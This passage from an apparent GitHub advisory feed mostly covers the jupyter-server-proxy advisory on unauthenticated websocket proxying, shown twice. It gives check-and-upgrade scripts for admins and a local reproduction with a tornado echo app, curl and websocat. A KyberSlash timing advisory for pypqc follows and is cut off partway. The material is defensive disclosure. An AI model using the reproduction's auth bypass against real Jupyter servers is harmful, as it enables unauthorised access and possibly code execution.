-c '\ntry:\n    import jupyter_server_proxy\n    is_vulnerable = not hasattr(jupyter_server_proxy, \"__version__\")\nexcept:\n    is_vulnerable = False\nif is_vulnerable:\n    print(\"WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.\")\nelse:\n    print(\"INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v\")\n'\n</code></pre>\n<p>Note that if you reference an image with a mutable tag, such as <code>quay.io/jupyter/pangeo-notebook:master</code>, you should ensure a new version is used by configuring the image pull policy so that an older vulnerable version isn't kept being used because it was already available on a Kubernetes node.</p>\n<pre><code class=\"language-yaml\">singleuser:\n  image:\n    name: quay.io/jupyter/pangeo-notebook\n    tag: master\n    # pullPolicy (a.k.a. imagePullPolicy in k8s specification) should be\n    # declared to Always if you make use of mutable tags\n    pullPolicy: Always\n</code></pre>\n<h4 id=\"2-patch-vulnerabilities-dynamically\">2. Patch vulnerabilities dynamically</h4>\n<p>If your z2jh deployment still may start vulnerable images for users, you could mount a script that checks and patches the vulnerability before the jupyter server starts.</p>\n<p>Below is JupyterHub Helm chart configuration that relies on <a href=\"https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-extrafiles\"><code>singleuser.extraFiles</code></a> and <a href=\"https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-cmd\"><code>singleuser.cmd</code></a> to mount a script we use as an entrypoint to dynamically check and patch the vulnerability before jupyter server is started.</p>\n<p>Unless you change it, the script will attempt to upgrade <code>jupyter-server-proxy</code> to a non-vulnerable version if needed, and error if it needs to and fails. You can adjust this behavior by adjusting the constants <code>UPGRADE_IF_VULNERABLE</code> and <code>ERROR_IF_VULNERABLE</code> inside the script.</p>\n<pre><code class=\"language-yaml\">singleuser:\n  cmd:\n    - /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run\n    - jupyterhub-singleuser\n  extraFiles:\n    ghsa-w3vc-fx9p-wp4v-check-patch-run:\n      mountPath: /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run\n      mode: 0755\n      stringData: |\n        #!/usr/bin/env python3\n        \"\"\"\n        This script is designed to check for and conditionally patch GHSA-w3vc-fx9p-wp4v\n        in user servers started by a JupyterHub. The script will execute any command\n        passed via arguments if provided, allowing it to wrap a user server startup call\n        to `jupyterhub-singleuser` for example.\n\n        Use and function of this script can be further discussed in\n        https://github.com/jupyterhub/zero-to-jupyterhub-k8s/issues/3360.\n\n        Script adjustments:\n        - UPGRADE_IF_VULNERABLE\n        - ERROR_IF_VULNERABLE\n\n        Script patching assumptions:\n        - script is run before the jupyter server starts\n        - pip is available\n        - pip has sufficient filesystem permissions to upgrade jupyter-server-proxy\n\n        Read more at https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.\n        \"\"\"\n\n        import os\n        import subprocess\n        import sys\n\n        # adjust these to meet vulnerability mitigation needs\n        UPGRADE_IF_VULNERABLE = True\n        ERROR_IF_VULNERABLE = True\n\n\n        def check_vuln():\n            \"\"\"\n            Checks for the vulnerability by looking to see if __version__ is available\n            as it coincides with the patched versions (3.2.3 and 4.1.1).\n            \"\"\"\n            try:\n                import jupyter_server_proxy\n\n                return False if hasattr(jupyter_server_proxy, \"__version__\") else True\n            except:\n                return False\n\n\n        def get_version_specifier():\n            \"\"\"\n            Returns a pip version specifier for use with `--no-deps` meant to do as\n            little as possible besides patching the vulnerability and remaining\n            functional.\n            \"\"\"\n            old = [\"jupyter-server-proxy&gt;=3.2.3,&lt;4\"]\n            new = [\"jupyter-server-proxy&gt;=4.1.1,&lt;5\", \"simpervisor&gt;=1,&lt;2\"]\n\n            try:\n                if sys.version_info &lt; (3, 8):\n                    return old\n\n                from importlib.metadata import version\n\n                jsp_version = version(\"jupyter-server-proxy\")\n                if int(jsp_version.split(\".\")[0]) &lt; 4:\n                    return old\n            except:\n                pass\n            return new\n\n\n        def patch_vuln():\n            \"\"\"\n            Attempts to patch the vulnerability by upgrading jupyter-server-proxy using\n            pip. Returns True if the patch is applied successfully, otherwise False.\n            \"\"\"\n            # attempt upgrade via pip, takes ~4 seconds\n            proc = subprocess.run(\n                [sys.executable, \"-m\", \"pip\", \"--version\"],\n                stdout=subprocess.DEVNULL,\n                stderr=subprocess.DEVNULL,\n            )\n            pip_available = proc.returncode == 0\n            if pip_available:\n                proc = subprocess.run(\n                    [sys.executable, \"-m\", \"pip\", \"install\", \"--no-deps\"]\n                    + get_version_specifier()\n                )\n                if proc.returncode == 0:\n                    return True\n            return False\n\n\n        def main():\n            if check_vuln():\n                warning_or_error = (\n                    \"ERROR\" if ERROR_IF_VULNERABLE and not UPGRADE_IF_VULNERABLE else \"WARNING\"\n                )\n                print(\n                    f\"{warning_or_error}: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see \"\n                    \"https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.\",\n                    flush=True,\n                )\n                if warning_or_error == \"ERROR\":\n                    sys.exit(1)\n\n                if UPGRADE_IF_VULNERABLE:\n                    print(\n                        \"INFO: Attempting to upgrade jupyter-server-proxy using pip...\",\n                        flush=True,\n                    )\n                    if patch_vuln():\n                        print(\n                            \"INFO: Attempt to upgrade jupyter-server-proxy succeeded!\",\n                            flush=True,\n                        )\n                    else:\n                        warning_or_error = \"ERROR\" if ERROR_IF_VULNERABLE else \"WARNING\"\n                        print(\n                            f\"{warning_or_error}: Attempt to upgrade jupyter-server-proxy failed!\",\n                            flush=True,\n                        )\n                        if warning_or_error == \"ERROR\":\n                            sys.exit(1)\n\n            if len(sys.argv) &gt;= 2:\n                print(\"INFO: Executing provided command\", flush=True)\n                os.execvp(sys.argv[1], sys.argv[1:])\n            else:\n                print(\"INFO: No command to execute provided\", flush=True)\n\n\n        main()\n</code></pre>\n<h4 id=\"3-consider-terminating-currently-running-user-servers-1\">3. Consider terminating currently running user servers</h4>\n<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>\n</details>\n\n<h2 id=\"simple-reproduction\">Simple Reproduction</h2>\n<details><summary>Expand to read more</summary>\n\n<h3 id=\"setup-application-to-proxy\">Setup application to proxy</h3>\n<p>Make a trivial tornado app that has both websocket and regular HTTP endpoints.</p>\n<pre><code class=\"language-python\">from tornado import websocket, web, ioloop\n\nclass EchoWebSocket(websocket.WebSocketHandler):\n    def open(self):\n        print(\"WebSocket opened\")\n\n    def on_message(self, message):\n        self.write_message(u\"You said: \" + message)\n\n    def on_close(self):\n        print(\"WebSocket closed\")\n\nclass HiHandler(web.RequestHandler):\n    def get(self):\n        self.write(\"Hi\")\n\napp = web.Application([\n    (r'/ws', EchoWebSocket),\n    (r'/hi', HiHandler)\n])\n\nif __name__ == '__main__':\n    app.listen(9500)\n    ioloop.IOLoop.instance().start()\n</code></pre>\n<h3 id=\"setup-a-clean-environment-with-jupyter-server-proxy-and-start-a-jupyter-server-instance\">Setup a clean environment with <code>jupyter-server-proxy</code> and start a <code>jupyter server</code> instance</h3>\n<p>We don't need jupyterlab or anything else here, just <code>jupyter-server-proxy</code> would do.</p>\n<pre><code class=\"language-bash\">python -m venv clean-env/\nsource clean-env/bin/activate\npip install jupyter-server-proxy\njupyter server\n</code></pre>\n<h3 id=\"verify-http-requests-require-authentication\">Verify HTTP requests require authentication</h3>\n<pre><code class=\"language-bash\">curl -L http://127.0.0.1:8888/proxy/9500/hi\n</code></pre>\n<p>This does <em>not</em> return the <code>Hi</code> response, as expected. Instead, you get the HTML response asking for a token.</p>\n<p>This is secure as intended.</p>\n<h3 id=\"verify-websocket-requests-doesnt-authentication\">Verify websocket requests doesn't authentication</h3>\n<p>The example makes use of <a href=\"https://github.com/vi/websocat\">websocat</a> to test websockets. You can use any other tool you are familiar with too.</p>\n<pre><code class=\"language-bash\">websocat ws://localhost:8888/proxy/9500/ws\n</code></pre>\n<p>At the terminal, type 'Just testing' and press Enter. You'll get <code>You said: Just testing</code> without any authentication required.</p>\n</details>\n### References\n\n<ul>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v\">https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9\">https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03\">https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28179\">https://nvd.nist.gov/vuln/detail/CVE-2024-28179</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433\">https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w3vc-fx9p-wp4v\">https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w3vc-fx9p-wp4v",
            "title": "[jupyter-server-proxy] Jupyter Server Proxy's Websocket Proxying does not require authentication",
            "date_modified": "2024-03-20T21:38:04.000Z",
            "date_published": "2024-03-20T15:22:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w3vc-fx9p-wp4v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><code>jupyter-server-proxy</code> is used to expose ports local to a Jupyter server listening to web traffic to the Jupyter server's <em>authenticated users</em> by proxying web requests and websockets. Dependent packages (<a href=\"https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/\">partial list</a>) also use <code>jupyter-server-proxy</code> to expose other popular interactive applications (such as <a href=\"https://github.com/jupyterhub/jupyter-rsession-proxy\">RStudio</a>, <a href=\"https://github.com/jupyterhub/jupyter-remote-desktop-proxy\">Linux Desktop via VNC</a>, <a href=\"https://github.com/betatim/vscode-binder\">Code Server</a>, <a href=\"https://github.com/holoviz/jupyter-panel-proxy\">Panel</a>, etc) along with the Jupyter server. This feature is commonly used in hosted environments (such as a JupyterHub) to expose non-Jupyter interactive frontends or APIs to the user.</p>\n<p><code>jupyter-server-proxy</code> did not check user authentication appropriately when proxying websockets, allowing unauthenticated access to anyone who had network access to the Jupyter server endpoint.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>This vulnerability can allow unauthenticated remote access to any websocket endpoint set up to be accessible via <code>jupyter-server-proxy</code>. In many cases (such as when exposing RStudio via <a href=\"https://github.com/jupyterhub/jupyter-rsession-proxy\"><code>jupyter-rsession-proxy</code></a> or a remote Linux Desktop / VNC via <a href=\"https://github.com/jupyterhub/jupyter-remote-desktop-proxy\"><code>jupyter-remote-desktop-proxy</code></a>), this leads to <strong>remote unauthenticated arbitrary code execution</strong>, due to how they use websockets. The websocket endpoints exposed by <code>jupyter_server</code> itself is not affected. Projects that do not rely on websockets are also not affected.</p>\n<h2 id=\"remediation\">Remediation</h2>\n<p>Upgrade <code>jupyter-server-proxy</code> to a patched version and restart any running Jupyter server.</p>\n<p>You may not be installing <code>jupyter-server-proxy</code> directly, but have it be pulled in as a dependency (<a href=\"https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/\">partial list of dependent packages</a>) - so you may be vulnerable even if you aren't directly depending on <code>jupyter-server-proxy</code>.</p>\n<h3 id=\"for-jupyterhub-admins-of-tljh-installations\">For JupyterHub admins of <a href=\"https://tljh.jupyter.org\">TLJH</a> installations</h3>\n<details><summary>Expand to read more</summary>\n\n<p>To secure a tljh deployment's user servers, first check if <code>jupyter-server-proxy</code> is installed in the user environment with a vulnerable version. If it is, patch the vulnerability and consider terminating currently running user servers.</p>\n<h4 id=\"1-check-for-vulnerability\">1. Check for vulnerability</h4>\n<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>\n<pre><code class=\"language-bash\">sudo -E python3 -c '\ntry:\n    import jupyter_server_proxy\n    is_vulnerable = not hasattr(jupyter_server_proxy, \"__version__\")\nexcept:\n    is_vulnerable = False\nif is_vulnerable:\n    print(\"WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.\")\nelse:\n    print(\"INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v\")\n'\n</code></pre>\n<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>\n<pre><code class=\"language-bash\">sudo PATH=/opt/tljh/user/bin:${PATH} python3 -c '\ntry:\n    import jupyter_server_proxy\n    is_vulnerable = not hasattr(jupyter_server_proxy, \"__version__\")\nexcept:\n    is_vulnerable = False\nif is_vulnerable:\n    print(\"WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.\")\nelse:\n    print(\"INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v\")\n'\n</code></pre>\n<h4 id=\"2-patch-detected-vulnerability\">2. Patch detected vulnerability</h4>\n<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>\n<pre><code class=\"language-bash\">sudo -E pip install \"jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0\"\n</code></pre>\n<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>\n<pre><code class=\"language-bash\">sudo PATH=/opt/tljh/user/bin:${PATH} pip install \"jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0\"\n</code></pre>\n<h4 id=\"3-consider-terminating-currently-running-user-servers\">3. Consider terminating currently running user servers</h4>\n<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>\n</details>\n\n<h3 id=\"for-jupyterhub-admins-of-z2jh-installations\">For JupyterHub admins of <a href=\"https://z2jh.jupyter.org\">Z2JH</a> installations</h3>\n<details><summary>Expand to read more</summary>\n\n<p>To secure your z2jh deployment's user servers, first consider if one or more user environments is or may be vulnerable, then ensure new user servers' aren't started with the vulnerability, and finally consider terminating currently running user servers. The steps below guide you to do so.</p>\n<h4 id=\"1-check-for-vulnerabilities\">1. Check for vulnerabilities</h4>\n<p>Consider all docker images that user servers' environment may be based on. If your deployment expose a fixed set of images, you may be able to update them to non-vulnerable versions.</p>\n<p>To check if an individual docker image is vulnerable, use a command like:</p>\n<pre><code class=\"language-bash\">CHECK_IMAGE=jupyter/base-notebook:2023-10-20\ndocker run --rm $CHECK_IMAGE python3 -c '\ntry:\n    import jupyter_server_proxy\n    is_vulnerable = not hasattr(jupyter_server_proxy, \"__version__\")\nexcept:\n    is_vulnerable = False\nif is_vulnerable:\n    print(\"WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.\")\nelse:\n    print(\"INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v\")\n'\n</code></pre>\n<p>Note that if you reference an image with a mutable tag, such as <code>quay.io/jupyter/pangeo-notebook:master</code>, you should ensure a new version is used by configuring the image pull policy so that an older vulnerable version isn't kept being used because it was already available on a Kubernetes node.</p>\n<pre><code class=\"language-yaml\">singleuser:\n  image:\n    name: quay.io/jupyter/pangeo-notebook\n    tag: master\n    # pullPolicy (a.k.a. imagePullPolicy in k8s specification) should be\n    # declared to Always if you make use of mutable tags\n    pullPolicy: Always\n</code></pre>\n<h4 id=\"2-patch-vulnerabilities-dynamically\">2. Patch vulnerabilities dynamically</h4>\n<p>If your z2jh deployment still may start vulnerable images for users, you could mount a script that checks and patches the vulnerability before the jupyter server starts.</p>\n<p>Below is JupyterHub Helm chart configuration that relies on <a href=\"https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-extrafiles\"><code>singleuser.extraFiles</code></a> and <a href=\"https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-cmd\"><code>singleuser.cmd</code></a> to mount a script we use as an entrypoint to dynamically check and patch the vulnerability before jupyter server is started.</p>\n<p>Unless you change it, the script will attempt to upgrade <code>jupyter-server-proxy</code> to a non-vulnerable version if needed, and error if it needs to and fails. You can adjust this behavior by adjusting the constants <code>UPGRADE_IF_VULNERABLE</code> and <code>ERROR_IF_VULNERABLE</code> inside the script.</p>\n<pre><code class=\"language-yaml\">singleuser:\n  cmd:\n    - /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run\n    - jupyterhub-singleuser\n  extraFiles:\n    ghsa-w3vc-fx9p-wp4v-check-patch-run:\n      mountPath: /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run\n      mode: 0755\n      stringData: |\n        #!/usr/bin/env python3\n        \"\"\"\n        This script is designed to check for and conditionally patch GHSA-w3vc-fx9p-wp4v\n        in user servers started by a JupyterHub. The script will execute any command\n        passed via arguments if provided, allowing it to wrap a user server startup call\n        to `jupyterhub-singleuser` for example.\n\n        Use and function of this script can be further discussed in\n        https://github.com/jupyterhub/zero-to-jupyterhub-k8s/issues/3360.\n\n        Script adjustments:\n        - UPGRADE_IF_VULNERABLE\n        - ERROR_IF_VULNERABLE\n\n        Script patching assumptions:\n        - script is run before the jupyter server starts\n        - pip is available\n        - pip has sufficient filesystem permissions to upgrade jupyter-server-proxy\n\n        Read more at https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.\n        \"\"\"\n\n        import os\n        import subprocess\n        import sys\n\n        # adjust these to meet vulnerability mitigation needs\n        UPGRADE_IF_VULNERABLE = True\n        ERROR_IF_VULNERABLE = True\n\n\n        def check_vuln():\n            \"\"\"\n            Checks for the vulnerability by looking to see if __version__ is available\n            as it coincides with the patched versions (3.2.3 and 4.1.1).\n            \"\"\"\n            try:\n                import jupyter_server_proxy\n\n                return False if hasattr(jupyter_server_proxy, \"__version__\") else True\n            except:\n                return False\n\n\n        def get_version_specifier():\n            \"\"\"\n            Returns a pip version specifier for use with `--no-deps` meant to do as\n            little as possible besides patching the vulnerability and remaining\n            functional.\n            \"\"\"\n            old = [\"jupyter-server-proxy&gt;=3.2.3,&lt;4\"]\n            new = [\"jupyter-server-proxy&gt;=4.1.1,&lt;5\", \"simpervisor&gt;=1,&lt;2\"]\n\n            try:\n                if sys.version_info &lt; (3, 8):\n                    return old\n\n                from importlib.metadata import version\n\n                jsp_version = version(\"jupyter-server-proxy\")\n                if int(jsp_version.split(\".\")[0]) &lt; 4:\n                    return old\n            except:\n                pass\n            return new\n\n\n        def patch_vuln():\n            \"\"\"\n            Attempts to patch the vulnerability by upgrading jupyter-server-proxy using\n            pip. Returns True if the patch is applied successfully, otherwise False.\n            \"\"\"\n            # attempt upgrade via pip, takes ~4 seconds\n            proc = subprocess.run(\n                [sys.executable, \"-m\", \"pip\", \"--version\"],\n                stdout=subprocess.DEVNULL,\n                stderr=subprocess.DEVNULL,\n            )\n            pip_available = proc.returncode == 0\n            if pip_available:\n                proc = subprocess.run(\n                    [sys.executable, \"-m\", \"pip\", \"install\", \"--no-deps\"]\n                    + get_version_specifier()\n                )\n                if proc.returncode == 0:\n                    return True\n            return False\n\n\n        def main():\n            if check_vuln():\n                warning_or_error = (\n                    \"ERROR\" if ERROR_IF_VULNERABLE and not UPGRADE_IF_VULNERABLE else \"WARNING\"\n                )\n                print(\n                    f\"{warning_or_error}: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see \"\n                    \"https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.\",\n                    flush=True,\n                )\n                if warning_or_error == \"ERROR\":\n                    sys.exit(1)\n\n                if UPGRADE_IF_VULNERABLE:\n                    print(\n                        \"INFO: Attempting to upgrade jupyter-server-proxy using pip...\",\n                        flush=True,\n                    )\n                    if patch_vuln():\n                        print(\n                            \"INFO: Attempt to upgrade jupyter-server-proxy succeeded!\",\n                            flush=True,\n                        )\n                    else:\n                        warning_or_error = \"ERROR\" if ERROR_IF_VULNERABLE else \"WARNING\"\n                        print(\n                            f\"{warning_or_error}: Attempt to upgrade jupyter-server-proxy failed!\",\n                            flush=True,\n                        )\n                        if warning_or_error == \"ERROR\":\n                            sys.exit(1)\n\n            if len(sys.argv) &gt;= 2:\n                print(\"INFO: Executing provided command\", flush=True)\n                os.execvp(sys.argv[1], sys.argv[1:])\n            else:\n                print(\"INFO: No command to execute provided\", flush=True)\n\n\n        main()\n</code></pre>\n<h4 id=\"3-consider-terminating-currently-running-user-servers-1\">3. Consider terminating currently running user servers</h4>\n<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>\n</details>\n\n<h2 id=\"simple-reproduction\">Simple Reproduction</h2>\n<details><summary>Expand to read more</summary>\n\n<h3 id=\"setup-application-to-proxy\">Setup application to proxy</h3>\n<p>Make a trivial tornado app that has both websocket and regular HTTP endpoints.</p>\n<pre><code class=\"language-python\">from tornado import websocket, web, ioloop\n\nclass EchoWebSocket(websocket.WebSocketHandler):\n    def open(self):\n        print(\"WebSocket opened\")\n\n    def on_message(self, message):\n        self.write_message(u\"You said: \" + message)\n\n    def on_close(self):\n        print(\"WebSocket closed\")\n\nclass HiHandler(web.RequestHandler):\n    def get(self):\n        self.write(\"Hi\")\n\napp = web.Application([\n    (r'/ws', EchoWebSocket),\n    (r'/hi', HiHandler)\n])\n\nif __name__ == '__main__':\n    app.listen(9500)\n    ioloop.IOLoop.instance().start()\n</code></pre>\n<h3 id=\"setup-a-clean-environment-with-jupyter-server-proxy-and-start-a-jupyter-server-instance\">Setup a clean environment with <code>jupyter-server-proxy</code> and start a <code>jupyter server</code> instance</h3>\n<p>We don't need jupyterlab or anything else here, just <code>jupyter-server-proxy</code> would do.</p>\n<pre><code class=\"language-bash\">python -m venv clean-env/\nsource clean-env/bin/activate\npip install jupyter-server-proxy\njupyter server\n</code></pre>\n<h3 id=\"verify-http-requests-require-authentication\">Verify HTTP requests require authentication</h3>\n<pre><code class=\"language-bash\">curl -L http://127.0.0.1:8888/proxy/9500/hi\n</code></pre>\n<p>This does <em>not</em> return the <code>Hi</code> response, as expected. Instead, you get the HTML response asking for a token.</p>\n<p>This is secure as intended.</p>\n<h3 id=\"verify-websocket-requests-doesnt-authentication\">Verify websocket requests doesn't authentication</h3>\n<p>The example makes use of <a href=\"https://github.com/vi/websocat\">websocat</a> to test websockets. You can use any other tool you are familiar with too.</p>\n<pre><code class=\"language-bash\">websocat ws://localhost:8888/proxy/9500/ws\n</code></pre>\n<p>At the terminal, type 'Just testing' and press Enter. You'll get <code>You said: Just testing</code> without any authentication required.</p>\n</details>\n### References\n\n<ul>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v\">https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9\">https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03\">https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28179\">https://nvd.nist.gov/vuln/detail/CVE-2024-28179</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433\">https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w3vc-fx9p-wp4v\">https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w3vc-fx9p-wp4v",
            "title": "[jupyter-server-proxy] Jupyter Server Proxy's Websocket Proxying does not require authentication",
            "date_modified": "2024-03-20T21:38:04.000Z",
            "date_published": "2024-03-20T15:22:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w3vc-fx9p-wp4v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><code>kyber512</code>, <code>kyber768</code>, and <code>kyber1024</code> only: An attacker able to submit many decapsulation requests against a single private key, and to gain timing information about the decapsulation, could recover the private key. Proof-of-concept exploit exists for a local attacker.</p>\n<p>CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N/E:P/RL:O/RC:C  </p>\n<h3 id=\"patches\">Patches</h3>\n<p>Version 0.0.6.1 and newer of PyPQC is patched.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workarounds have been reported. The 0.0.6 -&gt; 0.0.6.1 upgrade should be a drop-in replacement; it has no known breaking changes.</p>\n<h3 id=\"references\">References</h3>\n<h4 id=\"timeline\">Timeline</h4>\n<ol>\n<li><p>Cryspen researchers privately reported KyberSlash to the reference implementation maintainers.</p>\n</li>\n<li><p>Peter Schwabe partially patched KyberSlash (only \"KyberSlash 1\") in the reference implementation on December 1st, 2023, but did not document or advertise this as a security patch.<br><a href=\"https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220\">https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220</a></p>\n</li>\n<li><p>Daniel J. Bernstein publicly reported KyberSlash as a security issue on December 15th, 2023.<br><a href=\"https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ\">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ</a></p>\n</li>\n<li><p>Daniel J. Bernstein created a webpage for authoritative reference about KyberSlash on December 19th, 2023.<br><a href=\"https://kyberslash.cr.yp.to/\">https://kyberslash.cr.yp.to/</a></p>\n</li>\n<li><p>Thom Wiggers acknowledged KyberSlash as a security issue on December 19th, 2023.<br><a href=\"https://www.github.com/PQClean/PQClean/issues/533\">https://www.github.com/PQClean/PQClean/issues/533</a></p>\n</li>\n<li><p>Prasanna Ravi and Matthias Kannwischer privately reported further details about KyberSlash (\"KyberSlash 2\") to the reference implementation maintainers.</p>\n</li>\n<li><p>Peter Schwabe completely patched KyberSlash in the reference implementation on December 29th, 2023.\n<a href=\"https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816\">https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816</a></p>\n</li>\n<li><p>Prasanna Ravi and Matthias Kannwischer publicly reported their findings (\"KyberSlash 2\") on December 30th, 2023.<br><a href=\"https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/ovODsdY7AwAJ\">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/ovODsdY7AwAJ</a></p>\n</li>\n<li><p>Daniel J. Bernstein published a proof-of-concept exploit (only validated for a local attacker) for KyberSlash on December 30th, 2023.<br><a href=\"https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ\">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ</a></p>\n</li>\n<li><p>Thom Wiggers completely patched KyberSlash in PQClean on January 25th, 2024.<br>   <a href=\"https://www.github.com/PQClean/PQClean/commit/3b43bc6fe46fe47be38f87af5019a7f1462ae6dd\">https://www.github.com/PQClean/PQClean/commit/3b43bc6fe46fe47be38f87af5019a7f1462ae6dd</a></p>\n</li>\n<li><p>James E. A. completely patched KyberSlash in pypqc and released a security update on January 26th, 2024.<br>   <a href=\"https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6\">https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6</a></p>\n</li>\n</ol>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/JamesTheAwesomeDude/pypqc/security/advisories/GHSA-rc4p-p3j9-6577\">https://github.com/JamesTheAwesomeDude/pypqc/security/advisories/GHSA-rc4p-p3j9-6577</a></li>\n<li><a href=\"https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ\">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ</a></li>\n<li><a 